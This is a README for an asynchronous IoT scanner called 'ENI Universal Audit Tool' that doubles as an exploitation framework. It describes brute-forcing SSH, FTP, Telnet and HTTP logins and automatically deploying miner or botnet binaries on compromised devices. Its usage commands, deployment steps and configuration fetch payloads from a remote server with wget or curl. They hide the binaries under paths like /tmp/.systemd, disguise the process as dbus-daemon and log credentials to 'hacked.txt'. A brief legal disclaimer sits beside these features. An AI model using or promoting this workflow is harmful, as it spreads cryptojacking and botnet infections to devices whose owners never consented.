
# ENI Universal Audit Tool v6.3

**Support the project**  
If you find this tool useful, you can support its development by sending a donation:

**USDT (TRC20):** `TTQJJGoqGX3zxSKZX6ZfZVGexS3jjZ8C4m`

---

**ENI Universal Audit Tool** is a high-performance, asynchronous network scanner and exploitation framework designed for IoT device discovery, banner grabbing, architecture detection, brute‑force attacks, and automated payload deployment (miner or botnet). It supports IPv4 and IPv6, multiple protocols (SSH, FTP, HTTP/HTTPS, SNMP, mDNS, SSDP), and includes advanced features like resume scanning, encrypted credential storage, rate limiting, and flexible output formats.

---

## Features

- **Asynchronous scanning** – High speed, low resource consumption.
- **IPv4 and IPv6** – Full support for both address families.
- **Multi‑protocol service detection**:
  - SSH, FTP, HTTP/HTTPS (banner grabbing, title extraction, favicon hash, IoT‑specific path checks)
  - SNMP (community brute‑force via `aiosnmp` or `pysnmp`)
  - mDNS (using `zeroconf`)
  - SSDP (UPnP discovery)
- **Architecture detection** – Automatic identification of ARM, MIPS, x86_64, x86, PowerPC from banners, HTTP responses, and SNMP.
- **Brute‑force engine** – For SSH, FTP, Telnet, and HTTP Basic authentication (dictionary‑based).
- **Payload deployment** – Automatically download and execute pre‑compiled binaries (miner or botnet) on compromised devices with:
  - Payload existence check (HEAD request)
  - Architecture‑specific remote paths
  - Fallback paths
  - Process masking (e.g., rename to `dbus-daemon`)
- **Resume capability** – Skip already scanned (IP, port, service) pairs using an SQLite database.
- **Encrypted credentials** – Successful logins are stored in `hacked.txt` encrypted with Fernet (cryptography library).
- **Rate limiting** – Token‑bucket algorithm to control scan and brute‑force speeds.
- **Proxy support** – SOCKS5 proxy for anonymized scanning.
- **Multiple output formats** – TXT, CSV, JSON, Excel (XLSX), XML.
- **SQLite database** – Stores all scan results for later analysis and resume.
- **Configuration via YAML** – Easily customise service ports, deployment paths, SNMP communities, etc.
- **Graceful shutdown** – Handles Ctrl+C and cleans up resources.

---

## Requirements

- Python 3.7 or later
- Linux, macOS, or Windows (some features may be limited on Windows, e.g., MAC retrieval)

### Dependencies

Install all required packages via `pip`:

```bash
pip install -r requirements.txt
```

The `requirements.txt` file includes:

```
aiohttp
beautifulsoup4
paramiko
pysocks
pysnmp
aiosnmp
zeroconf
scapy
tqdm
pyyaml
cryptography
openpyxl
requests
```

Some libraries are optional; if missing, the tool will warn but continue with limited functionality.

---

## Installation

Clone the repository:

```bash
git clone https://github.com/yourname/eni-scanner.git
cd eni-scanner
```

Install dependencies:

```bash
pip install -r requirements.txt
```

Optionally, install the package to use the `eni-scanner` command:

```bash
pip install .
```

Then you can run it with:

```bash
eni-scanner --help
```

If you prefer to run the script directly, use:

```bash
python -m scanner --help
```

or the wrapper script:

```bash
./eni_scanner.py --help
```

---

## Usage

### Basic Scanning

Scan a local subnet for SSH and HTTP services:

```bash
eni-scanner --cidr 192.168.1.0/24 --services ssh,http --banner
```

### IPv6 Scanning

```bash
eni-scanner --6 --cidr 2001:db8::/64 --services ssh,ftp
```

### Scan with SOCKS5 Proxy

```bash
eni-scanner --cidr 10.0.0.0/24 --services http,https --proxy socks5://127.0.0.1:9050
```

### Save Results to SQLite and Export to JSON

```bash
eni-scanner --targets ips.txt --services snmp,ssdp --db scan.db --output report.json --format json
```

### Resume a Previous Scan

```bash
eni-scanner --cidr 192.168.1.0/24 --services ssh --resume --db scan.db
```

### Brute‑Force with Dictionary and Deploy Payload

```bash
eni-scanner --cidr 192.168.1.0/24 --services ssh --passwords creds.txt --authorized --deploy --payload-server http://your-server.com/payloads/ --payload-type miner
```

---

## Command‑Line Arguments

| Argument | Description |
|----------|-------------|
| `--cidr` | Network in CIDR notation (e.g., `192.168.1.0/24`). |
| `--6` | Use IPv6 (must be combined with `--cidr`). |
| `--targets` | File containing a list of IP addresses (one per line). |
| `--threads` | Number of concurrent scanning tasks (default: 50). |
| `--timeout` | Connection timeout in seconds (default: 2.0). |
| `--rate` | Maximum requests per second (scan). |
| `--services` | Comma‑separated list of services to probe: `ssh`, `ftp`, `http`, `https`, `snmp`, `ssdp`, `mdns`. |
| `--ports` | Comma‑separated list of ports (if you don't use `--services`). |
| `--banner` | Collect banners from open services. |
| `--proxy` | SOCKS5 proxy (e.g., `socks5://127.0.0.1:9050`). |
| `--local` | Attempt to retrieve MAC addresses (requires root and `scapy`). |
| `--format` | Output format: `txt`, `csv`, `json`, `xlsx`, `xml` (default: `txt`). |
| `--output` | Output file path. |
| `--db` | SQLite database file (used for storing results and resume). |
| `--passwords` | File with credentials in `user:pass` format (one per line). |
| `--authorized` | Enable brute‑force attacks. |
| `--max-attempts` | Maximum number of password attempts per target (default: 10). |
| `--auth-rate` | Maximum brute‑force attempts per second. |
| `--exclude-ips` | File with IPs to exclude from scanning. |
| `--exclude-ports` | Comma‑separated ports to exclude. |
| `--update-oui` | Update the OUI database from IEEE (requires internet). |
| `--snmp-communities` | File with SNMP community strings (one per line). |
| `--debug` | Enable debug logging. |
| `--payload-server` | URL of the server hosting payloads (e.g., `http://10.0.0.1:8080`). |
| `--deploy` | Automatically deploy payload after successful authentication. |
| `--payload-type` | Type of payload: `miner` or `botnet` (default: `miner`). |
| `--payload-path` | Override the remote path where the payload is stored. |
| `--resume` | Resume scanning from the last saved state (requires `--db`). |
| `--config` | Path to a custom YAML configuration file (default: `config.yaml`). |

---

## Configuration (`config.yaml`)

The tool reads settings from `config.yaml` in the current directory. You can override any value. Example:

```yaml
services:
  ssh: 22
  ftp: 21
  http: 8080
  https: 443
  snmp: 161
  ssdp: 1900
  mdns: 5353

deploy:
  remote_path: "/tmp/.systemd"
  fallback_paths: ["/var/tmp/.systemd", "/dev/shm/.systemd"]
  mask_name: "dbus-daemon"
  paths_by_arch:
    arm: "/data/local/tmp/.systemd"
    mips: "/var/run/.systemd"
    default: "/tmp/.systemd"

snmp:
  default_communities: ["public", "private", "admin", "root", "cisco", "mikrotik"]

rate_limiting:
  default_rate: null
  burst_capacity: 100

oui:
  update_on_start: false
  url: "https://standards-oui.ieee.org/oui/oui.txt"
```

---

## Output Formats

- **TXT** – Human‑readable, one line per result.
- **CSV** – Comma‑separated values, suitable for spreadsheet import.
- **JSON** – Structured data, easy for programmatic processing.
- **Excel (XLSX)** – Native Excel workbook with one worksheet.
- **XML** – Extensible Markup Language, convenient for integration.

---

## Payload Deployment

To use the automatic deployment feature, you need:

1. A web server hosting the payload binaries (e.g., `python3 -m http.server 8081` in the directory containing the payloads).
2. The payload files named according to the architecture:
   - `miner_x86_64`, `miner_i686`, `miner_armv7`, `miner_aarch64`, `miner_mips`, `miner_ppc`, `miner_generic`
   - For botnet: `botnet_x86_64`, etc.
3. The payload must be a statically compiled executable or a script with a shebang line.

When a target is compromised, the tool will:
- Check if the payload exists on the server (HEAD request).
- Download it using `wget` or `curl` (preferred).
- Verify the file size (≥ 1000 bytes).
- Move the file to a masked location (e.g., `/usr/bin/dbus-daemon`).
- Set executable permissions and launch it in the background.

---

## Security and Privacy

- **Credentials** are never stored in plain text. Successful logins are encrypted using Fernet with a key generated on first use (`hacked.key`).
- The SQLite database contains only metadata; passwords are stored as SHA‑256 hashes in a separate table.
- All network traffic can be routed through a SOCKS5 proxy for anonymity.

---

## Legal Disclaimer

This tool is intended for educational and authorised security testing only. Use it only on systems you own or have explicit written permission to test. Unauthorised scanning or exploitation of networks may violate local and international laws. The authors are not responsible for any misuse or damage caused by this software.

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

## Contributing

Contributions are welcome. Please open an issue or submit a pull request on the GitHub repository. Ensure you follow the existing code style and include tests for new features.

---

## Contact

For questions or support, please open an issue on the GitHub repository.

---

## Support the Project

If you find this tool useful, you can support its development by sending a donation:

**USDT (TRC20):** `TTQJJGoqGX3zxSKZX6ZfZVGexS3jjZ8C4m`

Thank you!
```
